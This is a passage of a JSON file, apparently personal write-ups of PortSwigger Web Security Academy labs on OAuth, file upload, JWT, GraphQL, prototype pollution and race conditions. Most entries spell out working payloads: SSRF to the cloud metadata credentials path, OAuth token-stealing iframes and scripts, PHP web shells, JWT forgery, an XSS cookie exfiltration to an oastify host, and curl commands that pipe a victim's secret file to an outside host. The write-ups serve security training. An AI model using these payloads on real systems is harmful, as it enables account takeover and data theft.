server."}]}, {"num": "21", "title": "OAuth Authentication", "labs": [{"num": "21.2", "difficulty": "PRACTITIONER", "title": "SSRF via dynamic client registration", "content": "This lab involves server-side request forgery (SSRF) through the OAuth provider's dynamic client registration feature. The provider allows unauthenticated client registration and uses the logo_uri \ufb01eld to fetch a logo image from a user\u2011supplied URL. This can be abused to make the server issue requests to internal endpoints, such as the cloud metadata service, exposing sensitive data like secret access keys. I \ufb01rst logged in as wiener and captured tra\ufb03c in Burp. I browsed to the OpenID con\ufb01guration endpoint at /.well-known/openid-con\ufb01guration and noted the client registration endpoint /reg. In Repeater, I registered a new client with a POST /reg request containing a redirect_uris array. The response returned a client_id. I then examined the OAuth \ufb02ow and found that the client logo is fetched from /client/CLIENT-ID/logo. To test SSRF, I registered another client but this time included a logo_uri pointing to a Burp Collaborator domain. After obtaining the new client_id, I requested /client/that-id/logo and saw an HTTP interaction in Collaborator, con\ufb01rming the server fetches the logo URL. Copy the id response, we will paste it to the GET /client/logo request. Change the logo_uri to http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/, registered a new client, and requested its logo endpoint. The response contained the cloud metadata, including the secret access key. \"logo_uri\" : \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\" On the response tab, copy the client_id. The root cause is trusting user\u2011supplied URLs without validation, allowing SSRF. To prevent this, the OAuth provider should restrict logo_uri to a whitelist of allowed domains or schemes (e.g., only https), require authentication for client registration, and avoid fetching resources from internal networks. Additionally, metadata endpoints should be protected by network\u2011level controls."}, {"num": "21.3", "difficulty": "PRACTITIONER", "title": "Forced pro\ufb01le linking", "content": "This lab demonstrates a forced OAuth pro\ufb01le linking vulnerability. The OAuth \ufb02ow lacks a state parameter, making it susceptible to CSRF. Additionally, the authorization code can be reused, allowing an attacker to attach their own social media pro\ufb01le to a victim's account I logged in as wiener and selected the option to attach a social pro\ufb01le. During the OAuth \ufb02ow, I intercepted the GET /oauth-linking?code=... request in Burp. I copied the full URL and then dropped the request to prevent the code from being consumed. On the exploit server, I created an iframe with that URL as its source. When the victim loaded this page, the iframe completed the OAuth \ufb02ow using my social media pro\ufb01le, linking it to the admin's account. I then logged out and chose \"Log in with social media,\" which granted me admin access. From the admin panel, I deleted carlos to solve the lab. The issue here is the missing state parameter, which allows CSRF attacks, combined with reusable authorization codes."}, {"num": "21.4", "difficulty": "PRACTITIONER", "title": "Account hijacking via redirect_uri", "content": "As I worked through the lab, I discovered that the OAuth provider was miscon\ufb01gured , it would accept any redirect_uri in the authorization request. By intercepting the OAuth \ufb02ow with Burp, I found my client ID and the OAuth server domain. I logged in with the wiener account and then logged out, capturing the OAuth request in Burp's HTTP history. I saved the client ID from that request, as it would be needed for the exploit script. In the exploit script, I used the OAuth server domain and client ID as the \ufb01rst part of the URL, and set the redirect_uri to my exploit server's address. After storing the script (don\u2019t immediately send it to the victim because this is not the right tab),Then view the exploit (same tab) where we should delivered it to the victim. The victim's browser then sent the authorization code to my exploit server, which appeared in my access logs. <iframe src=\"https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-C LIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=co de&scope=openid%20pro\ufb01le%20email\"></iframe> This iframe embeds a malicious OAuth authorization request that, when loaded by a victim with an active session, automatically redirects them to the attacker's server, leaking their authorization code via the URL parameter."}, {"num": "21.5", "difficulty": "PRACTITIONER", "title": "Access token theft via open redirect", "content": "The vulnerability stems from the OAuth service's failure to properly validate the redirect_uri, allowing an attacker to leak access tokens to arbitrary pages via an open redirect on the client application. First, I logged in with the provided credentials (wiener:peter) to analyze the OAuth \ufb02ow. After logging in, I identi\ufb01ed the GET /me endpoint, which fetches user data using an access token, and sent it to Burp Repeater. Next, I logged out and intercepted the OAuth authorization request (GET /auth?client_id=...). Attempting to change the redirect_uri to localhost resulted in a 400 error, indicating validation. However, appending /../ to the default redirect_uri triggered a 302 response, revealing a path traversal vulnerability. Go back to our homepage then using intercept on, Log out and click my account then send the GET /authclient request to the repeater. Further exploration uncovered an open redirect on the blog's \"Next post\" feature (GET /post/next?path=...), which allowed redirection to any external domain (e.g., google.com). I then crafted a malicious URL that combined the OAuth request with the path traversal and open redirect, pointing the \ufb01nal destination to my exploit server. The URL structure was: https://oauth-.../auth?client_id=...&redirect_uri=https://lab-id/oauth-callback/../post/next?path =https://exploit-server.net/exploit&response_type=token&nonce=...&scope=... When the victim (admin) visited this URL, the OAuth server redirected to the open redirect, which forwarded to my exploit server with the access token in the URL fragment. <script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID &redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?pat h=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce= 399721827&scope=openid%20pro\ufb01le%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script> I created an exploit script on my server to capture and log the token. After delivering the exploit, I obtained the admin's access token from the logs, used it in the Authorization: Bearer header of the GET /me request, and retrieved the admin's API key, which I submitted to solve the lab."}, {"num": "21.6", "difficulty": "EXPERT", "title": "Access token theft via proxy page", "content": "The OAuth service lets you log in with a social media account. It has a directory traversal \ufb02aw in the redirect_uri, so the access token can be sent to any page on the main site. Another page, the comment form, leaks its URL (including the fragment with the token) via postMessage to any origin. By combining these, we can steal the admin\u2019s token and use it to get their API key. This lab exploits two vulnerabilities: a directory traversal in the OAuth redirect_uri and a postMessage endpoint on the comment\u2011form page that sends the full URL (including the access token fragment) to any origin. I captured the OAuth \ufb02ow and saw I could change the redirect_uri using ../ to point to the comment form page: /oauth-callback/../post/comment/comment-form. That page uses postMessage with a wildcard origin, sending the full URL (fragment included) to its parent. I built an exploit on the exploit server: an iframe loading the OAuth URL with the tampered redirect_uri, plus a script to listen for messages and send the URL back to my server. I delivered it to the admin. Their token appeared in my access log. I used that token in the Authorization: Bearer header to call /me, got the admin\u2019s API key, and submitted it to solve the lab. The attack exploits insu\ufb03cient OAuth redirect_uri validation and insecure cross\u2011origin communication via postMessage. Prevention requires strict whitelisting of redirect URIs and avoiding wildcard origins for postMessage when sensitive data is involved."}]}, {"num": "22", "title": "File Upload Vulnerabilities", "labs": [{"num": "22.2", "difficulty": "APPRENTICE", "title": "Content-Type restriction bypass", "content": "The image upload function is vulnerable because it attempts to block unexpected \ufb01le types but relies on user-controllable input, speci\ufb01cally the Content-Type header to enforce this restriction. To solve the lab, I created a PHP \ufb01le containing the payload <?php echo \ufb01le_get_contents('/home/carlos/secret'); ?> and attempted to upload it. Initially blocked, I intercepted the request in Burp Suite and modi\ufb01ed the Content-Type header from application/x-php to image/jpeg. The server accepted the upload, storing my PHP \ufb01le in the avatars directory. I then right-clicked the uploaded \ufb01le to access it directly, which executed the PHP code and returned the secret \ufb02ag. A visual indicator con\ufb01rmed the bypass ,the avatar logo changed from a normal image to a torn paper icon, signaling my malicious \ufb01le was successfully uploaded."}, {"num": "22.3", "difficulty": "PRACTITIONER", "title": "Path traversal during upload", "content": "The image upload function lets users set avatars but blocks execution of uploaded \ufb01les in the avatars directory. A path traversal vulnerability in \ufb01lename handling allows uploading \ufb01les outside this directory where execution is allowed. Attack surface is the \ufb01lename parameter during upload and the server's URL decoding behavior. I logged in and uploaded a PHP web shell containing code to read Carlos's secret. The server accepted the PHP \ufb01le but when I requested it from /\ufb01les/avatars/exploit.php, it returned the source code instead of executing it. Execution was blocked in that directory. The server responded that avatars/exploit.php was uploaded, meaning it stripped the directory traversal. The vulnerability happened because the server decoded the \ufb01lename after it applied path sanitization. The URL encoded traversal bypassed the strip, and the \ufb01le landed in a directory where execution was permitted. Prevention means validating \ufb01lenames after all decoding, not before, and never letting user input control \ufb01le paths"}, {"num": "22.4", "difficulty": "PRACTITIONER", "title": "Extension blacklist bypass", "content": "The image upload function blocks \ufb01les with .php extensions using a blacklist. Apache server con\ufb01guration allows overriding \ufb01le handling through .htaccess \ufb01les. Attack surface is the \ufb01lename parameter during upload and the ability to upload con\ufb01guration \ufb01les that change how extensions are executed. I logged in and tried uploading exploit.php containing code to read Carlos's secret. The server blocked it due to the .php extension. The response headers revealed an Apache server. I uploaded a \ufb01le named .htaccess with Content-Type text/plain containing the directive AddType application/x-httpd-php .l33t. So i rename my exploit php script to l33t and then the server execute it as a php \ufb01le due to the htaccess command. The vulnerability happened because the blacklist only checked \ufb01le extensions but didn't prevent uploading con\ufb01guration \ufb01les that change how the server handles those extensions. The .htaccess \ufb01le bypassed the entire blacklist by remapping a harmless extension to executable code. Prevention means treating all \ufb01le uploads as untrusted, validating \ufb01le content not just extensions, and blocking con\ufb01guration \ufb01les like .htaccess entirely."}, {"num": "22.5", "difficulty": "PRACTITIONER", "title": "Obfuscated extension bypass", "content": "The image upload function blocks \ufb01les with certain extensions like .php using a blacklist. The server processes \ufb01lenames but may strip characters after a null byte. Attack surface is the \ufb01lename parameter during upload and how the server handles null byte encoding. I logged in and tried uploading exploit.php containing code to read Carlos's secret. The server blocked it, only allowing JPG and PNG \ufb01les. I intercepted the upload request and modi\ufb01ed the \ufb01lename to exploit.php%00.jpg. The null byte tells the server to stop processing the \ufb01lename at that point, so it sees exploit.php while the blacklist sees a .jpg extension. The upload succeeded and the message referred to the \ufb01le as exploit.php, con\ufb01rming the null byte and .jpg were stripped. I requested /\ufb01les/avatars/exploit.php and the server executed my shell, returning Carlos's secret. I submitted the secret and solved the lab. The vulnerability happened because the server decoded the \ufb01lename and stopped at the null byte before applying the blacklist. The blacklist saw .jpg and allowed it, but the server saved the \ufb01le as exploit.php. Prevention means validating \ufb01lenames after all decoding and rejecting any input containing null bytes entirely. The insight is that blacklists are only effective if the server interprets the \ufb01lename the same way at every stage. A single decoding discrepancy turns a block into a bypass."}, {"num": "22.6", "difficulty": "PRACTITIONER", "title": "Polyglot web shell upload", "content": "The image upload function blocks PHP \ufb01les through extension blacklisting and content validation using magic bytes. The server checks both \ufb01lename extensions and \ufb01le headers to ensure uploaded \ufb01les are legitimate images. Attack surface is the \ufb01le upload mechanism, which can be bypassed using polyglot \ufb01les that contain both a valid image header and embedded PHP code. I attempted to upload a PHP \ufb01le containing code to read Carlos's secret, but the server blocked it. Renaming the \ufb01le to a .jpg extension also failed, indicating the server checks \ufb01le content beyond extensions. I researched image magic numbers and found that GIF \ufb01les start with GIF89a. I created a \ufb01le with that header followed by my PHP payload: GIF89a<?php echo \ufb01le_get_contents('/home/carlos/secret'); ?>. The server accepted it as a valid image and stored it. When I requested the \ufb01le, the PHP executed and returned the secret. An alternative method using exiftool to embed the payload into an image comment also works. I submitted the secret and solved the lab."}, {"num": "22.7", "difficulty": "EXPERT", "title": "Race condition exploitation", "content": "I prepared two requests in Burp Suite. One POST request attempted to upload exploit.php containing code to read Carlos's secret. Five GET requests targeted the uploaded \ufb01le location. I duplicated both requests across ten tabs and sent them in rapid succession. The POST placed the \ufb01le temporarily. Some GET requests reached the server during that short window before validation \ufb01nished and deleted the \ufb01le. Those requests returned the secret. I submitted the secret and solved the lab."}]}, {"num": "23", "title": "JWT", "labs": [{"num": "23.2", "difficulty": "APPRENTICE", "title": "Flawed signature veri\ufb01cation", "content": "This involves bypassing JWT authentication by exploiting a server miscon\ufb01guration that accepts unsigned tokens. The server fails to verify signatures properly, allowing attackers to modify token contents and even remove the signature entirely. After logging in with the provided credentials, the session cookie can be examined in Burp Suite's HTTP history. The token is a JWT containing three parts: header, payload, and signature. Using the Inspector panel, the payload reveals the sub claim identifying the user as \"wiener\". To gain admin access, the sub claim is changed to \"administrator\". The header contains an alg parameter specifying the algorithm used for signing, which defaults to \"RS256\". This value is changed to \"none\", indicating to the server that no signature should be expected. The signature portion of the token is then removed entirely, leaving only the header and payload separated by a dot. Sending this modi\ufb01ed token in a request to /admin grants access to the admin panel. From there, the endpoint for deleting Carlos, /admin/delete?username=carlos, is located and requested to complete the lab."}, {"num": "23.3", "difficulty": "PRACTITIONER", "title": "Weak signing key exploitation", "content": "I logged in using the credentials wiener:peter and sent the GET /my-account request to Burp Repeater. The request appeared violet in color, indicating it contained a JWT token. I changed the path to /admin and sent the request, con\ufb01rming admin access was blocked. I downloaded the JWT secret wordlist from GitHub. Using hashcat, I brute-forced the secret key with this command: hashcat -a 0 -m 16500 <jwt-token> /path/to/jwt.secrets.list The tool revealed the weak secret was secret1. I took the found secret and converted it to Base64 using CyberChef. In Burp's JWT Editor Keys tab, I created a new symmetric key, replaced the k value with my Base64-encoded secret, and saved it. Back in Repeater, I opened the JSON Web Token tab, changed the sub claim from \"wiener\" to \"administrator\", and clicked Sign using my newly created key. Sending the modi\ufb01ed request granted access to /admin. I found the URL to delete Carlos (/admin/delete?username=carlos) and sent the request to solve the lab. The jwt secrets here was weak cause we just brute-forced it using wordlists. This could be prevented by using a strong, complex secrets that cannot be easily guessed to prevent token forgery attacks."}, {"num": "23.4", "difficulty": "PRACTITIONER", "title": "JWK header injection", "content": "This uses JWT for session handling. The server supports the jwk parameter in the JWT header, allowing the veri\ufb01cation key to be embedded directly in the token. However, it fails to verify whether the embedded key comes from a trusted source, creating a serious vulnerability. I logged in using the credentials wiener:peter and sent the GET /my-account request to Burp Repeater. The violet-colored request con\ufb01rmed it contained a JWT token. Changing the endpoint to /admin and sending the request con\ufb01rmed that admin access was blocked. In the JWT Editor Keys tab, I clicked New RSA Key, then Generate to create a new key pair, and saved it. Returning to Repeater, I opened the JSON Web Token tab and modi\ufb01ed the payload by changing the sub claim from \"wiener\" to \"administrator\". At the bottom of the tab, I clicked Attack, selected Embedded JWK, and chose my newly generated RSA key. This automatically added a jwk parameter containing my public key to the JWT header. Sending the modi\ufb01ed request granted access to the admin panel. I located the URL for deleting Carlos (/admin/delete?username=carlos) and sent the request to solve the lab. This server \ufb02aw was trusting key supplied by the client. The server should never accept veri\ufb01cation keys directly from the token. Always use trusted, pre-con\ufb01gured keys from a secure source."}, {"num": "23.5", "difficulty": "PRACTITIONER", "title": "JKU header injection", "content": "This uses JWT for session handling. The server supports the jku (JWK Set URL) header, which points to a URL containing the veri\ufb01cation key. However, it fails to validate whether this URL comes from a trusted source, allowing attackers to host their own key set and forge tokens. I sent the violet-colored GET /my-account request to Burp Repeater and changed the endpoint to /admin, con\ufb01rming admin access was denied. In the JWT Editor Keys tab, I created a new RSA key by clicking New RSA Key, then Generate, and saved it. I right-clicked the generated key and selected Copy Public Key as JWK. On the lab's main page, I went to the exploit server and pasted the copied JWK into the body, then stored it. The exploit server provided a URL where this JWK was now hosted. Back in Repeater, I opened the JSON Web Token tab. In the header, I changed the kid parameter to match the kid from my hosted JWK. I added a new jku parameter with the value set to my exploit server URL. Finally, I modi\ufb01ed the payload by changing the sub claim from \"wiener\" to \"administrator\". Sending this request granted access to /admin. I found the URL to delete Carlos (/admin/delete?username=carlos) and sent the request to solve the lab. The server vulnerability is that The server trusts a user-supplied URL (jku) to fetch the veri\ufb01cation key without validating the source. Attackers can host their own key and point the server to it. To prevent this kind of vulnerability Only fetch keys from trusted, pre-con\ufb01gured URLs. Never accept key locations from the token itself. Validate that any jku references match an allowlist of approved endpoints."}, {"num": "23.6", "difficulty": "PRACTITIONER", "title": "kid header path traversal", "content": "This lab uses JWT for session handling. The server uses the kid (Key ID) parameter in the JWT header to fetch the veri\ufb01cation key from its \ufb01lesystem. By manipulating this parameter with path traversal, the server can be tricked into using an arbitrary \ufb01le as the key. I sent the violet-colored GET /my-account request to Burp Repeater and changed the endpoint to /admin, con\ufb01rming admin access was denied. In the JWT Editor Keys tab, I clicked New Symmetric Key and generated a new key. I replaced the k value with AA==. This is a Base64-encoded null byte, which represents an empty key. Since the JWT Editor won't allow signing with an empty string, AA== is a workaround that effectively means \"use nothing as the key.\" Back in Repeater, I opened the JSON Web Token tab. In the header, I changed the kid parameter to ../../../../../../../dev/null. This path traversal tricks the server into reading the /dev/null \ufb01le, which is empty on Linux systems. The server will use this empty \ufb01le as the veri\ufb01cation key. I changed the payload sub claim from \"wiener\" to \"administrator\" and clicked Sign using my symmetric key. Sending the request returned a 200 OK, con\ufb01rming admin access. I found the URL to delete Carlos (/admin/delete?username=carlos) and sent the request to solve the lab. The vulnerability here is that the server trusts user-supplied kid values to fetch key \ufb01les without validation. Path traversal allows pointing to any \ufb01le, like /dev/null, making the signature veri\ufb01cation meaningless."}, {"num": "23.7", "difficulty": "EXPERT", "title": "Algorithm confusion attack", "content": "This application uses a RSA key pair to sign and verify tokens but it is vulnerable to algorithm confusion attacks. I need to obtain the public key, but looking at this endpoint of /jwks.json exposes and we can see the \u201csingle public key\u201d. Go to the JWT Editor keys and Add a new RSA key, paste the keys that we got from the website application /jwks.json New RSA key and then drop the JWK copied. Then again click new Symmetric key then Generate a new key in JWK format,Replace the \u201ck\u201d value. Im using decoder to paste here the public key when we right click the Symmetric key. Going back to the Repeater JSON Web Tokens just change the value alg parameter to HS256 and the sub claim into administrator. If the response 200 ok we can now delete the user Carlos. The vulnerability here is that it accepts token signed with asymmetric algorithms but does not strictly enforce the expected algorithm."}, {"num": "23.8", "difficulty": "EXPERT", "title": "Algorithm confusion without exposed key", "content": "This uses a robust RSA key pair to sign and verify tokens but it is vulnerable to algorithm confusion attacks. Log-in using the personal credentials wiener. Send GET /my-account to the repeater and change it as a admin. The panel is only visible to role administrator. Copy the JWT session cookie then logout, do this two times so that we can able to get two new JWT session cookie. Paste it to a notepad and then using a docker \ufb01le on the CLI use this command: docker run --rm -it portswigger/sig2n <token1> <token2> This command runs the \u201csign2n\u201d tool inside a Docker container to derive possible RSA public keys from two valid JWTs. The token 1 and token 2 are the session that we copy and its a two different JWTs , different jti, different iat but signed by the same private key. The mathematical attack to recover n needs two distinct message-signature pairs and the command sign2 implements that. It extracts the signed message and treats the RSA signatures as raw numbers. The tampered JWT is signed as HS256 using a derived public key as the secret. Replace the cookie session using the candidate key."}]}, {"num": "24", "title": "Essential Skills", "labs": [{"num": "24.2", "difficulty": "PRACTITIONER", "title": "Scanning non-standard data structures", "content": "I logged in and found my session cookie contained wiener:token. I selected the wiener part and used Burp Scanner's Scan selected insertion point. The scan detected a stored XSS via Collaborator interactions. I inject a script on the cookies section ,to get the administrator key. \u2019'\"><svg/onload%3dfetch(`//znq87d1mv5r3bhti76o71is1osujii67.oastify.com/${encodeURIComponent(document.cookie)}`)>%3aDNcmuJgepZ30Tx NPDkImFHNJ2RRDxNFk The single quote, double quote, and angle bracket close any prior HTML attributes or tags to escape into a new context, while the <svg/onload= tag creates an element that executes JavaScript upon loading. The backticks allow a template literal embedding the fetch request, which uses encodeURIComponent(document.cookie) to send the victim's cookies to the Collaborator domain, and the colon separates this injected payload from the original token to maintain session integrity. After sending, I polled Collaborator and received the admin user's cookies from an HTTP interaction. I replaced my session cookie with the admin, refreshed, accessed the admin panel, and deleted carlos to solve the lab."}]}, {"num": "25", "title": "Prototype Pollution", "labs": [{"num": "25.2", "difficulty": "PRACTITIONER", "title": "DOM XSS via prototype pollution", "content": "On this lab i use DOM invader extension. Open the Burp built in browser then Enable the DOM invader. It is located on the browser DevTools panel and then i start to scan for gadgets. When it was finish scanning the DOM invader successfully accessed the script.src sink via transport_url gadget. /?__proto__[transport_url]=data:,alert(1); I polluted Object.prototype.value with data:,alert(1). When the page loaded, a <script src=\"data:,alert(1);\"> was inserted, and the alert \ufb01red."}, {"num": "25.3", "difficulty": "PRACTITIONER", "title": "Alternative vector DOM XSS", "content": "First is to use DOM invader to fin da source where we can add arbitrary properties to global \u201cObject.prototype\u201d. Scan for gadgets The standard __proto__[property] does not work, but dot notation __proto__.property does. A gadget in searchLoggerAlternative.js passes manager.sequence to eval(), and since manager.sequence is undefined, it falls back to the polluted prototype New tab will open when the DOM invader start scanning. Observing the results it has \u201ceval()\u201d I examined searchLoggerAlternative.js and found an eval() sink using manager sequence and it is a property that was not de\ufb01ned. I injected /?__proto__.sequence=alert(1)-. Without the minus, the payload becomes alert(1)1, which is invalid JavaScript syntax (a function call followed by a number). Adding - changes it to alert(1)-1, which is valid - the function executes, and its result (unde\ufb01ned) is subtracted from 1, but the alert already \ufb01res."}, {"num": "25.4", "difficulty": "PRACTITIONER", "title": "Flawed sanitization bypass", "content": "I first tried standard prototype pollution vectors like /?__proto__.foo=bar, but Object.prototype remained unchanged. I looked at the JavaScript and found a sanitizeKey() function that removes blocked substrings, but only once. I crafted a payload where the blocked substring appears after the initial cleanup: /?__pro__proto__to__[transport_url]=data:,alert(1); The sanitizer removes __proto__ which effectively pollutes Object.prototype.transport_url. I reloaded the page, and a <script src=\"data:,alert(1);\"> appeared."}, {"num": "25.5", "difficulty": "PRACTITIONER", "title": "Third-party library pollution", "content": "I opened the lab in Burp\u2019s browser, enabled DOM Invader with prototype pollution detection, and reloaded the page. DOM Invader identified two pollution vectors in the URL hash. I ran a gadget scan, which found that the hitCallback property is used in a setTimeout() sink. DOM Invader generated an exploit URL that set __proto__[hitCallback]=alert(1) and triggered the alert. I then crafted a payload on the exploit server that navigated the victim to /#__proto__[hitCallback]=alert%28document.cookie%29."}, {"num": "25.6", "difficulty": "PRACTITIONER", "title": "Server-side privilege escalation", "content": "I logged in as wiener and went to the account page to change my address. I intercepted the POST /my-account/change-address request in Burp. The request contained a JSON object with address fields, and the response returned an updated user object. I added a new property \"__proto__\": { \"foo\":\"bar\" } to the JSON body. In the response, the user object now contained a foo property, but no __proto__ - indicating that foo was inherited from the polluted prototype. I then changed the payload to \"__proto__\": { \"isAdmin\": true }. The response showed \"isAdmin\": true because the object did not have its own isAdmin property and instead inherited it. After refreshing the page in the browser, I saw an admin panel link. I navigated to /admin and deleted the user carlos."}, {"num": "25.7", "difficulty": "PRACTITIONER", "title": "Detection without re\ufb02ection", "content": "I logged in as wiener and intercepted the POST /my-account/change-address request, which sends address data as JSON. The server responds with a user object. First, I tested adding \"__proto__\": {\"foo\":\"bar\"} to the JSON. The response did not show foo, so pollution was not directly re\ufb02ected. I added a new property \"__proto__\": { \"foo\":\"bar\" } to the JSON body. In the response, the user object now contained a foo property, but no __proto__ indicating that foo was inherited from the polluted prototype. I then changed the payload to \"__proto__\": { \"isAdmin\": true }. I broke the JSON syntax once more and re\u2011sent the request. This time, the error response contained \"status\": 555 and \"statusCode\": 555, con\ufb01rming that the server had inherited my polluted status property from the prototype chain."}, {"num": "25.8", "difficulty": "PRACTITIONER", "title": "Input \ufb01lter bypass", "content": "I logged in as wiener and intercepted the POST /my-account/change-address request. The request sends address data as JSON, and the response returns the updated user object. I \ufb01rst attempted to pollute the prototype directly with \"__proto__\": {\"json spaces\":10} and looked for changes in JSON formatting - none occurred, suggesting __proto__ was \ufb01ltered. I then tried a nested approach: \"constructor\": {\"prototype\": {\"json spaces\":10}}. After sending this, the response\u2019s JSON indentation increased, con\ufb01rming successful prototype pollution. So next is to test it isAdmin true and it shows in the response meaning it was injerited the pollutes property."}, {"num": "25.9", "difficulty": "PRACTITIONER", "title": "Remote code execution", "content": "I logged in as wiener and captured the POST /my-account/change-address request, which sends address data as JSON. I added \"__proto__\": {\"json spaces\":10} to the JSON body. The response showed increased JSON indentation, confirming successful prototype pollution. In the admin panel, I found a \u201cRun maintenance jobs\u201d button that spawns Node.js child processes. I modi\ufb01ed the pollution payload to include this payload : After sending the request and triggering the maintenance job, Burp Collaborator received DNS interactions, con\ufb01rming RCE. I changed the command to rm /home/carlos/morale.txt, sent the payload again, and triggered the job."}, {"num": "25.10", "difficulty": "EXPERT", "title": "Sensitive data ex\ufb01ltration", "content": "I logged in as wiener and intercepted the POST /my-account/change-address request, which sends address data as JSON. I added \"__proto__\": {\"json spaces\":10} to the JSON body. The response showed increased indentation, confirming prototype pollution. To leak the hidden \ufb01le name, I changed input to \":! ls /home/carlos | base64 | curl -d @- https://collaborator.oastify.com\\n\". After triggering the job, Collaborator received a POST with the base64\u2011encoded directory listing, which decoded to node_apps and secret. I then modi\ufb01ed input to \":! cat /home/carlos/secret | base64 | curl -d @- https://collaborator.oastify.com\\n\". The new Collaborator interaction contained the base64\u2011encoded secret. I decoded it and submitted it. The decoded VALUE : Yf6AWUk1dqbVsAjOMqWvG1V8N79QENCr"}]}, {"num": "26", "title": "GraphQL API Vulnerabilities", "labs": [{"num": "26.2", "difficulty": "PRACTITIONER", "title": "Exposure of private \ufb01elds", "content": "The goal of this lab is to access the administrator account by exploiting a GraphQL endpoint that exposes sensitive user information. After logging in as the administrator, I need to delete the user carlos to solve the lab. I started by logging into the application with my own credentials and noticed in Burp's HTTP history that the login attempt was sent as a GraphQL mutation containing a username and password. I sent this request to Repeater for further testing. I copy the lab link and insert into the InQL extension, then i copy this getUser query and go back to repeater then paste it to the InQl repeater tab. The query used an id parameter to fetch speci\ufb01c users. I sent this query to Repeater and tested different id values. The default id of 0 returned nothing, but when I changed it to 1, the API returned the administrator's credentials. With the administrator password in hand, I logged in as the administrator, accessed the admin panel, and deleted carlos to solve the lab.."}, {"num": "26.3", "difficulty": "PRACTITIONER", "title": "Hidden endpoint discovery", "content": "The goal of this lab was to \ufb01nd a hidden GraphQL endpoint that had introspection disabled and then use it to delete the user carlos. I started by using Burp Repeater to test common GraphQL endpoint paths, but i cant see anything and I noticed that sending a GET request to /api returned a \"Query not present\" error, which hinted that a GraphQL endpoint might exist there. To con\ufb01rm, I appended a simple universal query like ?query=query{__typename} and received a response con\ufb01rming it was indeed a GraphQL endpoint. /api?query=query{__typename} You can ask GraphQL to tell you everything about itself using something called introspection. It's like asking for a map of the whole system. But this lab blocked that feature. When I tried, it said no. The server was looking for the exact words __schema{ in my request and blocking it. So I added a new line in the middle like __schema{ with an extra space. This made it look different to the server but still worked as a valid question. The server then gave me the full map. With the map in hand, I could see all the available questions I could ask and actions I could take. I saved this information and looked through it. I found a question called getUser that let me look up users by ID number. I also found an action called deleteOrganizationUser that let me delete users. I send to the repeater, this 2 requests from the GRAPHQL then we get getUser :null. I tested different ID numbers with the getUser question until I found that carlos had ID 3. Then I used the deleteOrganizationUser action with ID 3, sent it to the hidden endpoint, and carlos was deleted."}, {"num": "26.4", "difficulty": "PRACTITIONER", "title": "Brute-force protection bypass", "content": "The login \ufb01eld has the graphql value here, The goal is to log-in as carlos. Send this to Repeater. After a short period of time the API starts to return a rate limit error. I created a lists of Aliases, which is a multiple operations of the same type in one request by giving each one a unique name. The bruteforce0 part is the alias. It can be anything as long as each one is different. Inside the parentheses, I put the actual username and password directly instead of using a variable. Then I asked for both token and success back, just like your original mutation did."}, {"num": "26.5", "difficulty": "PRACTITIONER", "title": "CSRF over GraphQL", "content": "The user management function here is the GraphQL endpoint and the endpoint accepts requests with a content-type of x-www-form-urlencoded. The goal is to craft HTML that uses a CSRF attack. I \ufb01rst try to log-in using own credentials(wiener) then update our email. Send those request to the repeater. At the repeater i change again the email to a new one and send the request. We can notice here that we can still reuse our session cookie to multiple requests. I change the Content-type and the body to a new query. Then right click \u201cEngagement tools and generate a CSRF poc then paste the HTML to our exploit server body."}]}, {"num": "27", "title": "Race Conditions", "labs": [{"num": "27.2", "difficulty": "PRACTITIONER", "title": "Rate limit bypass", "content": "I first verified that the rate limit applies per user and that failed attempts are counted server\u2011 side. Using Burp Repeater, I sent a group of parallel login requests for my own account and saw that more than three attempts returned the \u201cInvalid username\u201d response before the lock took effect. This confirmed a race window. I then sent the login request to Turbo Intruder with the race-single-packet-attack template. I set the username to carlos and pasted the list of candidate passwords into the payload position. The script queued each password with a gate, then released all requests simultaneously. One of the responses was a 302 redirect, indicating a successful login. I used that password to log in as carlos, accessed the admin panel, and deleted the user."}, {"num": "27.3", "difficulty": "PRACTITIONER", "title": "Multi-endpoint race condition", "content": "I prepared three requests in Burp Repeater and put them in one group. The \ufb01rst was a simple GET / request to warm up the connection. The second was a POST /cart request where I changed the product ID from 2 (gift card) to 1 (leather jacket). The third was a POST /cart/checkout request to place the order. Notice here at the picture below that When i try to send the GET /cart request with cookie and without cookie it has our item & an empty cart. The \ufb01rst few attempts failed, giving me the \"insu\ufb03cient funds\" error message. But after several tries, I \ufb01nally got a successful response Before starting the attack, I made sure my shopping cart had only one gift card worth $10. Then I switched the send mode to \"Send group in parallel\" and \ufb01red all three requests at the exact same time. It took a few tries, but eventually I got a 200 OK response and successfully bought the expensive jacket with only $10 in my account. This attack worked because of a race condition. The server checked my balance \ufb01rst, but before it \ufb01nished processing the order, I swapped the cheap gift card for the expensive jacket. The server validated the cheap cart but charged me for the expensive one. To stop this kind of attack, the website should check your cart and charge you at the exact same time. No gap and no chance to swap items."}, {"num": "27.4", "difficulty": "PRACTITIONER", "title": "Single-endpoint race condition", "content": "I logged into my account and tried changing my email address a few times. The website sent me con\ufb01rmation links each time. I noticed something important: when I requested 3 email changes without con\ufb01rming them, only the most recent con\ufb01rmation link actually worked. The older ones expired. This told me the website only keeps track of one pending email change at a time. I captured the email change request in Burp and sent it to Repeater. I duplicated it 20 times and changed each email to test1@, test2@, test3@, test4@ etc (incremently). When I sent these one after another normally, I got 20 separate con\ufb01rmation emails, each matching the right address. Nothing interesting happened. I switched to sending all 20 requests at the exact same time using the single-packet attack. When I checked my email client, something weird had happened: the tokens got mixed up. For example, test4's con\ufb01rmation email contained the token meant for test1. This con\ufb01rmed there was a tiny time window where the system gets confused when hit with multiple requests at once. I reduced my tab group to just two requests. The \ufb01rst one I set to my email address. The second one I set to carlos@ginandjuice.shop. I \ufb01red them both simultaneously. When I checked my email, I saw a con\ufb01rmation link meant for my address but containing Carlos's token. I clicked it and successfully changed Carlos's email to my address. This gave me access to his account and the admin panel, where I deleted Carlos to complete the lab. The website stored one pending email change at a time. When hit with parallel requests, it got confused and swapped the con\ufb01rmation tokens between users. This let me steal Carlos's email change."}, {"num": "27.5", "difficulty": 